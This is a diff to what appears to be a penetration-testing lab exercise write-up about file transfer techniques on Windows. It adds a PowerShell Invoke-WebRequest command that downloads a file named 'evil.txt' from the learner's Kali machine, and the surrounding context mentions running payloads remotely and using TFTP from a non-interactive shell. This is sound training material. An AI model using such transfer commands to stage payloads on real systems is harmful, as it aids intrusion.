@@ -91,6 +91,9 @@ Or as a one liner, executing the requested payload remotely rather than saving a
 
 **3.  For PowerShell version 3 and above, which is present by default on Windows 8.1 and Windows 10, the cmdlet [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-6) was added. Try to make use of it in order to perform both upload and download requests to your Kali machine.**
 
+To use Invoke-WebRequest to download a file from our Kali server we can use the following command (note the shorthand IWR which is used in place of the full command Invoke-WebRequest)
+`powershell IWR -uri http://192.168.119.130:9002/evil.txt -OutFile evil_IWR.txt`
+
 
 **4.  Use TFTP to transfer files from a non-interactive shell from Kali to Windows.**
 
